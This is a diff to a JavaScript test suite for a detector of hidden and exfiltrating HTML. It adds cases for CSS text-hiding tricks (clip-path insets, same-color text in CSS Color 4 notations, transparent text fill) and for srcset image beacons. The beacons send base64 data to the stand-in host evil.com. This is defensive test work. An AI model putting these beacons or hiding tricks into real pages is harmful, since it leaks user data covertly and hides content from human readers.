@@ -122,6 +122,14 @@ const HIDDEN_STYLE_CASES = [
   ["clip-path:circle(50%)", false],
   ["clip-path:inset(10%)", false], // partial inset still shows content
   ["clip-path:inset(10px)", false],
+  ["clip-path:inset(50% 0 0 0)", false], // only the top half is clipped — bottom stays visible
+  ["clip-path:inset(50% 50%)", true], // 2-value: all four edges resolve to 50%
+  ["clip-path:inset(60% 70% 80% 90%)", true], // 4-value, every edge >=50%
+  ["clip-path:inset(50% 50% 50% 10%)", false], // one open edge (left 10%) keeps content visible
+  ["clip-path:inset(200px)", false], // length inset cannot be proven to collapse — fail open
+  ["clip-path:inset(50% round 10px)", true], // `round <radius>` suffix ignored
+  ["clip-path:inset()", false], // no edges — fail open
+  ["clip-path:inset(1% 2% 3% 4% 5%)", false], // too many edges — malformed, fail open
   // ── transform: scale / rotate edge-on / translate offscreen ──
   ["transform:scale(0)", true],
   ["transform:scale( 0)", true],
@@ -159,7 +167,29 @@ const HIDDEN_STYLE_CASES = [
   ["color:rgb(255,255,255);background:white", true], // rgb vs named
   ["color:white;background-color:rgb(255, 255, 255)", true],
   ["color:#000;background:rgb(0,0,0)", true], // black on black
-  ["color:white;background:#fff url(x) no-repeat", true], // background shorthand carries the color
+  // CSS Color 4 notations canonicalize for the same-color compare.
+  ["color:rgb(255 255 255);background:white", true], // space-separated rgb
+  ["color:rgb(100% 100% 100%);background:#fff", true], // percentage channels
+  ["color:hsl(0 0% 100%);background-color:white", true], // hsl white on white
+  ["color:hsl(0, 0%, 0%);background:#000", true], // legacy-comma hsl black on black
+  ["color:rgb(0 0 0 / 0);background:white", true], // zero alpha = transparent text
+  ["color:rgba(1,2,3,0);background:white", true], // legacy comma 4th-channel zero alpha
+  ["color:rgba(255,255,255,0.5);background-color:white", true], // non-zero alpha ignored for the hex compare
+  ["color:hsl(0 0% 100%);background:hsl(0 0% 50%)", false], // distinct hsl lightness
+  // hsl hue sectors (each 60° arc of the conversion) as same-color hides.
+  ["color:hsl(90 100% 50%);background-color:hsl(90 100% 50%)", true],
+  ["color:hsl(150 100% 50%);background-color:hsl(150 100% 50%)", true],
+  ["color:hsl(210 100% 50%);background-color:hsl(210 100% 50%)", true],
+  ["color:hsl(270 100% 50%);background-color:hsl(270 100% 50%)", true],
+  ["color:hsl(330 100% 50%);background-color:hsl(330 100% 50%)", true],
+  // hsl hue angle units and bare-number saturation/lightness (CSS Color 4).
+  ["color:hsl(200grad 100% 50%);background-color:hsl(0.5turn 100% 50%)", true], // 200grad === 0.5turn === 180deg
+  ["color:hsl(3.14159265rad 100 50);background-color:hsl(180 100% 50%)", true], // π rad === 180deg; bare-number s/l
+  ["color:rgb(none 0 0);background-color:rgb(none 0 0)", false], // unresolvable channel — fail open (not concrete)
+  ["color:hsl(0 nope 50%)", false], // unresolvable saturation — fail open
+  ["color:hsl(nope 100% 50%)", false], // unresolvable hue — fail open
+  ["color:rgb(1 2 3 / 4 / 5)", false], // two slashes — malformed, fail open
+  ["color:rgb(1 2)", false], // wrong channel count — fail open
   ["color:red", false],
   ["color:white", false], // color alone, no background — never infer the page bg
   ["color:white;background:#fefefe", false], // near-white but not equal
@@ -167,6 +197,15 @@ const HIDDEN_STYLE_CASES = [
   ["color:white;background-color:black", false],
   ["background-color:white", false], // color absent — not same-color
   ["color:rgb(0,0,0);background:rgb(255,255,255)", false],
+  // ── image-layer background: same flat color is not provably the backdrop ──
+  ["color:white;background:#fff url(x) no-repeat", false], // url image can paint over the text — fail open
+  ["color:#000;background:rgb(0,0,0) url(x)", false], // image layer, fail open
+  ["color:white;background:#fff linear-gradient(#fff,#000)", false], // gradient layer, fail open
+  // ── gradient-clipped / text-filled heading is visible despite transparent color ──
+  ["color:transparent;-webkit-background-clip:text", false],
+  ["color:transparent;background-clip:text", false],
+  ["color:transparent;-webkit-text-fill-color:#111", false], // fill color overrides transparent
+  ["color:transparent;-webkit-text-fill-color:transparent", true], // fill also transparent — still hidden
   // ── unresolved color tokens: can't prove same-color, so fail open ──
   ["color:var(--fg);background-color:var(--fg)", false], // same var, but resolves via cascade — not provably equal
   ["color:inherit;background:inherit", false], // inherit color != inherit background-color
@@ -799,6 +838,29 @@ describe("unit: detectExfil HTML-attr + node types", () => {
       `<img srcset="https://evil.com/p.png?data=${b64} 2x">`,
     );
     assert.equal(threat.isImage, true);
+    assert.equal(threat.target, "evil.com");
+  });
+  it("parses srcset per the descriptor grammar: candidate commas split, parens and commas-in-parens do not", () => {
+    // Candidate 1 has a parenthesized descriptor whose inner comma must NOT end
+    // the candidate; candidate 2 (after the real separator comma) is the exfil.
+    const threat = onlyThreat(
+      `<img srcset="https://ok.com/a.png (foo,bar), https://evil.com/b.png?data=${b64} 2x">`,
+    );
+    assert.equal(threat.isImage, true);
+    assert.equal(threat.target, "evil.com");
+  });
+  it("handles a bare srcset candidate (URL then comma, no descriptor)", () => {
+    // First candidate's URL run ends in a comma (no descriptor); the second is
+    // the exfil beacon.
+    const threat = onlyThreat(
+      `<img srcset="https://ok.com/a.png, https://evil.com/b.png?data=${b64} 2x">`,
+    );
+    assert.equal(threat.target, "evil.com");
+  });
+  it("keeps a srcset URL that itself contains commas intact (no split shredding)", () => {
+    const threat = onlyThreat(
+      `<img srcset="https://evil.com/b.png?a=1,2&data=${b64} 2x">`,
+    );
     assert.equal(threat.target, "evil.com");
   });
   it("flags an exfil ping attribute on an anchor", () =>
